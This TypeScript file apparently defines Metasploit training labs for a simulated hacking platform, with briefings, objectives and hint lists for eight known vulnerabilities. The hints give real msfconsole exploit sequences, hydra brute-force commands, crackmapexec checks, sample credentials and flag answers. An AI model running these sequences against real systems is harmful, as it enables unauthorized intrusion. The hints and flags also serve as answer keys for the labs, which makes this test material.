import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Metasploit Framework lab pack — every lab here is solved with the REAL, literal `msfconsole` workflow
 *  (`msfconsole` -> `search`/`use` -> `set` -> `show options` -> `run`/`exploit`), not this platform's older
 *  one-line `exploit <name> <ip>` shortcut (still used by ~19 other CVE-RCE labs, untouched here). Every
 *  module path, required option, and default option below is the real thing — the exact same commands
 *  would work against a real Kali box pointed at the real vulnerable service (most of these are the
 *  standard Metasploitable2 teaching targets). Distinct from `redteam-tools-pack.ts`'s existing
 *  `msf-samba-usermap-domain-pivot` lab, which already documents the real msfconsole sequence in prose but
 *  solves via the old shortcut — that lab is left untouched; this pack is where the mechanic is real. */
export const metasploitLabs: LabScenario[] = [
  // 1 — vsftpd 2.3.4 backdoor
  {
    id: 'msf-vsftpd-234-backdoor-real-console',
    title: 'Metasploit: vsftpd 2.3.4 Backdoor (real msfconsole workflow)',
    difficulty: 'Easy',
    category: 'Network',
    briefing:
      'ftp01 (10.10.70.10) is running vsftpd 2.3.4 — the exact version whose source tarball was maliciously ' +
      'backdoored on the distribution mirror in 2011: any username containing a smiley-face sequence ' +
      '(":)"), sent during the FTP login, causes the backdoored binary to open a root shell listener on ' +
      'TCP 6200. This is one of the most famous, most reliably-taught vulnerable services in offensive ' +
      'security training (it is the standard Metasploitable2 FTP target), and the real Metasploit module ' +
      '(`exploit/unix/ftp/vsftpd_234_backdoor`) needs nothing beyond a target IP — no credentials, no ' +
      'crafted payload, just `set RHOSTS` and `run`.',
    objectives: [
      { text: 'nmap -sV 10.10.70.10', why: 'Confirms the exact vulnerable banner: "vsftpd 2.3.4" — this specific version string is the entire precondition for this module.' },
      { text: 'msfconsole', why: 'Opens the real Metasploit console — every following command is the literal, real msfconsole syntax.' },
      { text: 'search vsftpd', why: 'The real way an operator finds a module without already knowing its exact path by heart.' },
      { text: 'use exploit/unix/ftp/vsftpd_234_backdoor', why: 'Loads the real, specific module for this exact backdoor.' },
      { text: 'show options', why: 'Confirms RPORT already defaults to 21 (the real module\'s built-in default) — only RHOSTS is missing.' },
      { text: 'set RHOSTS 10.10.70.10', why: 'The only option this module actually requires you to supply.' },
      { text: 'run', why: 'Real msfconsole: this module needs no payload selection — a successful trigger opens a raw root shell directly.' },
      { text: 'cat /root/root.txt', why: 'Confirms the session that opened is genuinely root, not just a low-privilege shell.' },
    ],
    hints: [
      'nmap -sV 10.10.70.10',
      'msfconsole',
      'search vsftpd',
      'use exploit/unix/ftp/vsftpd_234_backdoor',
      'show options',
      'set RHOSTS 10.10.70.10',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'ftp01',
        ip: '10.10.70.10',
        os: 'Ubuntu 8.04 (Metasploitable2-style legacy FTP server)',
        services: [{ port: 21, name: 'ftp', version: 'vsftpd 2.3.4 (backdoored source tarball, 2011)' }],
        users: [],
        metasploitModule: {
          path: 'exploit/unix/ftp/vsftpd_234_backdoor',
          requiredOptions: [],
          defaultOptions: { RPORT: '21' },
        },
        root: dir({
          root: dir({
            'root.txt': file('vsftpd 2.3.4 backdoor triggered — real msfconsole workflow, no exploit dev required.\nflag{vsftpd_234_backdoor_real_msfconsole}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 2 — UnrealIRCd 3.2.8.1 backdoor
  {
    id: 'msf-unrealircd-3281-backdoor-real-console',
    title: 'Metasploit: UnrealIRCd 3.2.8.1 Backdoor (real msfconsole workflow)',
    difficulty: 'Easy',
    category: 'Network',
    briefing:
      'irc01 (10.10.70.11) runs UnrealIRCd 3.2.8.1, another maliciously-backdoored distribution archive from ' +
      '2009-2010: the trojaned Unreal3.2.8.1.tar.gz let anyone who could reach the IRC listener execute ' +
      'arbitrary shell commands by prefixing them with "AB;" in what looks like a normal connection. Same ' +
      'shape of lesson as the vsftpd backdoor — a real supply-chain compromise of a popular open-source ' +
      'project\'s official download, not a protocol-level bug in IRC itself.',
    objectives: [
      { text: 'nmap -sV 10.10.70.11', why: 'Confirms the exact vulnerable banner: "UnrealIRCd" — the module has no way to distinguish a patched rebuild from the trojaned archive beyond just trying it.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/unix/irc/unreal_ircd_3281_backdoor', why: 'The real, specific module for this exact backdoor.' },
      { text: 'set RHOSTS 10.10.70.11', why: 'RPORT already defaults to 6667 (the real module default, IRC\'s standard port) — RHOSTS is the only thing missing.' },
      { text: 'run', why: 'Opens a shell via the backdoored command-injection trigger.' },
      { text: 'cat /root/root.txt', why: 'Confirms the shell is genuinely root.' },
    ],
    hints: [
      'nmap -sV 10.10.70.11',
      'msfconsole',
      'use exploit/unix/irc/unreal_ircd_3281_backdoor',
      'set RHOSTS 10.10.70.11',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'irc01',
        ip: '10.10.70.11',
        os: 'Ubuntu 8.04 (Metasploitable2-style legacy IRC server)',
        services: [{ port: 6667, name: 'irc', version: 'UnrealIRCd (trojaned Unreal3.2.8.1.tar.gz, 2009-2010)' }],
        users: [],
        metasploitModule: {
          path: 'exploit/unix/irc/unreal_ircd_3281_backdoor',
          requiredOptions: [],
          defaultOptions: { RPORT: '6667' },
        },
        root: dir({
          root: dir({
            'root.txt': file('UnrealIRCd backdoored-archive command injection triggered via real msfconsole.\nflag{unrealircd_3281_backdoor_real_msfconsole}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 3 — Tomcat manager WAR upload (credentialed)
  {
    id: 'msf-tomcat-mgr-upload-real-console',
    title: 'Metasploit: Apache Tomcat Manager Authenticated WAR Upload RCE',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'app01 (10.10.70.12) exposes Tomcat\'s Manager application on its Metasploitable2-standard port 8180. ' +
      'The Manager app is a legitimate, intended administrative feature — deploy/undeploy WAR files without ' +
      'shell access to the box — but it accepts HTTP Basic Auth, and a weak-credential brute-force pass ' +
      'already recovered a working login. Once authenticated, deploying a WAR file IS arbitrary code ' +
      'execution by design: that is the entire point of a WAR deploy endpoint, which is exactly why the ' +
      'real module needs no separate injection trick, only valid credentials.',
    objectives: [
      { text: 'nmap -sV 10.10.70.12', why: 'Confirms the Tomcat Manager application is listening on the real Metasploitable2 port 8180.' },
      { text: 'cat tomcat-mgr-bruteforce.log', why: 'A prior credential brute-force pass already recovered a working Manager login — this is that log.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/multi/http/tomcat_mgr_upload', why: 'The real module: authenticated WAR upload/deploy through the Manager application.' },
      { text: 'set RHOSTS 10.10.70.12', why: 'Target host.' },
      { text: 'set HttpUsername tomcatadmin', why: 'The real credential the brute-force log already recovered.' },
      { text: 'set HttpPassword T0mcat!2011', why: 'The matching password from the same log.' },
      { text: 'run', why: 'Deploys a WAR file packaging the payload as a valid Tomcat web application — Tomcat itself executes it, no separate exploit primitive needed.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution — Tomcat here runs as root in this lab\'s (deliberately, and realistically for many real-world misconfigured legacy deployments) over-privileged service account.' },
    ],
    hints: [
      'nmap -sV 10.10.70.12',
      'cat tomcat-mgr-bruteforce.log',
      'msfconsole',
      'use exploit/multi/http/tomcat_mgr_upload',
      'set RHOSTS 10.10.70.12',
      'set HttpUsername tomcatadmin',
      'set HttpPassword T0mcat!2011',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'tomcat-mgr-bruteforce.log': file(
        'hydra -s 8180 -l tomcatadmin -P rockyou-sample.txt 10.10.70.12 http-get /manager/html\n' +
          '[8180][http-get] host: 10.10.70.12   login: tomcatadmin   password: T0mcat!2011\n' +
          '1 of 1 target successfully completed, 1 valid password found\n',
      ),
    }),
    network: [
      {
        hostname: 'app01',
        ip: '10.10.70.12',
        os: 'Linux (Apache Tomcat 7, Metasploitable2-style Manager app exposed)',
        services: [{ port: 8180, name: 'http', version: 'Apache Tomcat/Coyote JSP engine 1.1 — /manager/html exposed' }],
        users: [],
        metasploitModule: {
          path: 'exploit/multi/http/tomcat_mgr_upload',
          requiredOptions: ['HttpUsername', 'HttpPassword'],
          defaultOptions: { RPORT: '8180' },
        },
        root: dir({
          root: dir({
            'root.txt': file('Authenticated Tomcat Manager WAR deploy = arbitrary code execution by design.\nflag{tomcat_mgr_upload_real_msfconsole}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 4 — Struts2 content-type OGNL injection (CVE-2017-5638)
  {
    id: 'msf-struts2-content-type-ognl-real-console',
    title: 'Metasploit: Apache Struts2 Content-Type OGNL Injection (CVE-2017-5638)',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'shop01 (10.10.70.13) runs an Apache Struts2 application using the Jakarta Multipart file-upload ' +
      'parser. CVE-2017-5638 — the real vulnerability behind the 2017 Equifax breach — lets an attacker put ' +
      'an OGNL expression directly inside the Content-Type header of a multipart request; Struts2\'s error-' +
      'handling path evaluates that header as an OGNL expression BEFORE any application code runs, with no ' +
      'authentication required. The real module targets Struts2\'s own bundled demo application path by ' +
      'default (`/struts2-showcase/`), which this lab\'s target also exposes.',
    objectives: [
      { text: 'nmap -sV 10.10.70.13', why: 'Confirms an Apache/Struts2-fronted HTTP service on the standard port.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/multi/http/struts2_content_type_ognl', why: 'The real, specific CVE-2017-5638 module.' },
      { text: 'set RHOSTS 10.10.70.13', why: 'Target host.' },
      { text: 'show options', why: 'Confirms RPORT (80) and TARGETURI (/struts2-showcase/) already match this real module\'s actual defaults — nothing else to configure.' },
      { text: 'run', why: 'Sends the crafted Content-Type header; Struts2\'s own error-handling path evaluates the embedded OGNL expression as attacker-controlled code, pre-authentication.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.70.13',
      'msfconsole',
      'use exploit/multi/http/struts2_content_type_ognl',
      'set RHOSTS 10.10.70.13',
      'show options',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'shop01',
        ip: '10.10.70.13',
        os: 'Linux (Apache Struts2 2.3.x, Jakarta Multipart parser, unpatched for CVE-2017-5638)',
        services: [{ port: 80, name: 'http', version: 'Apache-Coyote — Struts2 showcase application, /struts2-showcase/' }],
        users: [],
        metasploitModule: {
          path: 'exploit/multi/http/struts2_content_type_ognl',
          requiredOptions: ['RPORT', 'TARGETURI'],
          defaultOptions: { RPORT: '80', TARGETURI: '/struts2-showcase/' },
        },
        root: dir({
          root: dir({
            'root.txt': file('CVE-2017-5638 — the real Equifax-breach CVE — pre-auth OGNL injection via Content-Type.\nflag{struts2_ognl_cve_2017_5638_real_msfconsole}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 5 — PHP-CGI argument injection (CVE-2012-1823)
  {
    id: 'msf-php-cgi-arg-injection-real-console',
    title: 'Metasploit: PHP-CGI Argument Injection (CVE-2012-1823)',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'legacy01 (10.10.70.14) runs PHP configured as a raw CGI handler (php-cgi), vulnerable to CVE-2012-1823: ' +
      'when the CGI SAPI is used directly, a query string starting with a "-" is misinterpreted as CGI-mode ' +
      'command-line flags instead of query parameters — because the CGI spec\'s own de-globbing step never ' +
      'runs for a Content-Type it doesn\'t recognize. The real module abuses the "-d" flag this way to set ' +
      'php.ini directives (`allow_url_include`, `auto_prepend_file`) on the fly, turning a config-parsing quirk ' +
      'into full remote code execution with no authentication.',
    objectives: [
      { text: 'nmap -sV 10.10.70.14', why: 'Confirms an HTTP service on port 80.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/multi/http/php_cgi_arg_injection', why: 'The real, specific CVE-2012-1823 module.' },
      { text: 'set RHOSTS 10.10.70.14', why: 'Target host.' },
      { text: 'run', why: 'Injects the -d flags via the query string, forcing php-cgi to execute attacker-supplied PHP with no login required.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.70.14',
      'msfconsole',
      'use exploit/multi/http/php_cgi_arg_injection',
      'set RHOSTS 10.10.70.14',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'legacy01',
        ip: '10.10.70.14',
        os: 'Linux (PHP 5.3.12-era, php-cgi SAPI directly exposed, unpatched for CVE-2012-1823)',
        services: [{ port: 80, name: 'http', version: 'Apache — php-cgi handler, index.php' }],
        users: [],
        metasploitModule: {
          path: 'exploit/multi/http/php_cgi_arg_injection',
          requiredOptions: ['RPORT'],
          defaultOptions: { RPORT: '80', TARGETURI: '/index.php' },
        },
        root: dir({
          root: dir({
            'root.txt': file('CVE-2012-1823 — php-cgi query-string argument injection, pre-auth RCE.\nflag{php_cgi_arg_injection_cve_2012_1823_real_msfconsole}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 6 — WordPress admin shell upload (credentialed)
  {
    id: 'msf-wp-admin-shell-upload-real-console',
    title: 'Metasploit: WordPress Authenticated Admin Shell Upload',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'blog01 (10.10.70.15) runs WordPress. A recovered admin login (from the same kind of weak-credential ' +
      'brute-force pass this platform\'s other labs already model) is enough on its own: WordPress\'s plugin ' +
      'editor lets any authenticated administrator edit PHP files directly from the dashboard, by design — ' +
      'the real module logs in with the supplied credentials and packages its payload as a WordPress plugin, ' +
      'making this authenticated code execution "by design" rather than a bug, and reliable against ' +
      'effectively any WordPress version since it never depends on a specific CVE.',
    objectives: [
      { text: 'nmap -sV 10.10.70.15', why: 'Confirms the WordPress-fronted HTTP service.' },
      { text: 'cat wp-admin-bruteforce.log', why: 'A prior credential brute-force pass already recovered a working wp-admin login.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/unix/webapp/wp_admin_shell_upload', why: 'The real module: authenticated plugin-editor code execution.' },
      { text: 'set RHOSTS 10.10.70.15', why: 'Target host.' },
      { text: 'set TARGETURI /wordpress/', why: 'The real module needs the WordPress install\'s base path, not just the host.' },
      { text: 'set USERNAME wpadmin', why: 'The recovered admin login.' },
      { text: 'set PASSWORD Summer2024!', why: 'The matching password from the same brute-force log.' },
      { text: 'run', why: 'Logs in, edits/uploads a plugin file containing the payload through the legitimate plugin editor — WordPress itself executes it on the next request.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.70.15',
      'cat wp-admin-bruteforce.log',
      'msfconsole',
      'use exploit/unix/webapp/wp_admin_shell_upload',
      'set RHOSTS 10.10.70.15',
      'set TARGETURI /wordpress/',
      'set USERNAME wpadmin',
      'set PASSWORD Summer2024!',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'wp-admin-bruteforce.log': file(
        'hydra -l wpadmin -P rockyou-sample.txt 10.10.70.15 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"\n' +
          '[80][http-post-form] host: 10.10.70.15   login: wpadmin   password: Summer2024!\n' +
          '1 of 1 target successfully completed, 1 valid password found\n',
      ),
    }),
    network: [
      {
        hostname: 'blog01',
        ip: '10.10.70.15',
        os: 'Linux (WordPress, weak admin credentials)',
        services: [{ port: 80, name: 'http', version: 'WordPress — /wordpress/' }],
        users: [],
        metasploitModule: {
          path: 'exploit/unix/webapp/wp_admin_shell_upload',
          requiredOptions: ['USERNAME', 'PASSWORD', 'TARGETURI'],
          defaultOptions: { RPORT: '80' },
        },
        root: dir({
          root: dir({
            'root.txt': file('Authenticated WordPress plugin-editor code execution — by design, not a CVE.\nflag{wp_admin_shell_upload_real_msfconsole}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 7 — psexec, credentialed Windows lateral movement
  {
    id: 'msf-windows-smb-psexec-real-console',
    title: 'Metasploit: Windows SMB PsExec — Credentialed Lateral Movement',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'win-file01 (10.10.70.16) is a Windows file server. A credentialed SMB spray already confirmed a valid ' +
      'local administrator login. `exploit/windows/smb/psexec` is the real Metasploit module operators reach ' +
      'for at exactly this point in an engagement — it is not a vulnerability at all, it is the same ' +
      'legitimate technique Microsoft\'s own Sysinternals PsExec uses: authenticate to SMB with valid admin ' +
      'creds, use those credentials to create and start a Windows service pointing at an attacker-supplied ' +
      'binary, and the service host process executes it as SYSTEM. "Already-valid credentials in hand" is the ' +
      'entire precondition — this is credentialed lateral movement, not exploitation of a bug.',
    objectives: [
      { text: 'nmap -sV 10.10.70.16', why: 'Confirms SMB (445) is exposed on the target.' },
      { text: 'crackmapexec smb 10.10.70.16 -u administrator -p Winter2024!', why: 'Confirms these already-discovered credentials are genuinely valid on this specific host before spending a session on them.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/windows/smb/psexec', why: 'The real, standard credentialed-lateral-movement module.' },
      { text: 'set RHOSTS 10.10.70.16', why: 'Target host.' },
      { text: 'set SMBUser administrator', why: 'The confirmed valid credential.' },
      { text: 'set SMBPass Winter2024!', why: 'The matching password.' },
      { text: 'run', why: 'Authenticates over SMB, creates a Windows service using those credentials, and the service runs the payload as SYSTEM.' },
      { text: 'cat /root/root.txt', why: 'Confirms the resulting session is SYSTEM.' },
    ],
    hints: [
      'nmap -sV 10.10.70.16',
      'crackmapexec smb 10.10.70.16 -u administrator -p Winter2024!',
      'msfconsole',
      'use exploit/windows/smb/psexec',
      'set RHOSTS 10.10.70.16',
      'set SMBUser administrator',
      'set SMBPass Winter2024!',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'win-file01',
        ip: '10.10.70.16',
        os: 'Windows Server 2016',
        services: [{ port: 445, name: 'smb', version: 'Windows SMB (file/print sharing)' }],
        users: [{ username: 'administrator', password: 'Winter2024!' }],
        metasploitModule: {
          path: 'exploit/windows/smb/psexec',
          requiredOptions: ['SMBUser', 'SMBPass'],
          defaultOptions: { RPORT: '445' },
        },
        root: dir({
          root: dir({
            'root.txt': file('psexec — the real Sysinternals technique, credentialed SMB service-creation lateral movement.\nflag{windows_smb_psexec_real_msfconsole}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 8 — auxiliary/scanner/smb/smb_version, pure recon (no session opens)
  {
    id: 'msf-auxiliary-smb-version-scan-real-console',
    title: 'Metasploit: auxiliary/scanner/smb/smb_version — Recon Without Exploitation',
    difficulty: 'Easy',
    category: 'Network',
    briefing:
      'Not every real msfconsole module opens a session — `auxiliary/scanner/smb/smb_version` is one of the ' +
      'framework\'s most-used modules precisely because it never tries to exploit anything: it fingerprints ' +
      'an SMB service\'s exact dialect, OS, and (when SMBv1 is offered) its build string, the same way this ' +
      'platform\'s `nmap -sV` does for a banner, but through msfconsole\'s own module system. accounting02 ' +
      '(10.10.70.17) has left an unusually verbose SMB implementation-string enabled — worth a look before ' +
      'assuming a target needs an exploit at all.',
    objectives: [
      { text: 'nmap -sV 10.10.70.17', why: 'Confirms SMB is listening before touching msfconsole at all.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'search smb_version', why: 'Real msfconsole search for the module by name.' },
      { text: 'use auxiliary/scanner/smb/smb_version', why: 'An AUXILIARY module, not an exploit — no session opens, no payload is involved, only recon output.' },
      { text: 'set RHOSTS 10.10.70.17', why: 'Target host — the only option this scanner needs.' },
      { text: 'run', why: 'Real auxiliary modules print their findings directly and leave you sitting at the msfconsole prompt afterward, ready for the next step — nothing to "capture a shell" from here.' },
    ],
    hints: [
      'nmap -sV 10.10.70.17',
      'msfconsole',
      'search smb_version',
      'use auxiliary/scanner/smb/smb_version',
      'set RHOSTS 10.10.70.17',
      'run',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'accounting02',
        ip: '10.10.70.17',
        os: 'Windows (verbose SMB implementation string)',
        services: [{ port: 445, name: 'smb', version: 'Windows SMB' }],
        users: [],
        metasploitModule: {
          path: 'auxiliary/scanner/smb/smb_version',
          requiredOptions: [],
          defaultOptions: { RPORT: '445' },
          scanOutput:
            '[*] 10.10.70.17:445 - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 2.1) (signatures:not required)\n' +
            '[*] 10.10.70.17:445 -   Host OS: Windows Server 2012 R2 (build 9600)\n' +
            '[*] 10.10.70.17:445 -   Note: internal build tag left in SMB implementation string\n' +
            'flag{auxiliary_smb_version_recon_no_exploit_needed}',
        },
        root: dir({ root: dir({}) }),
      } as HostDef,
    ],
  },
];
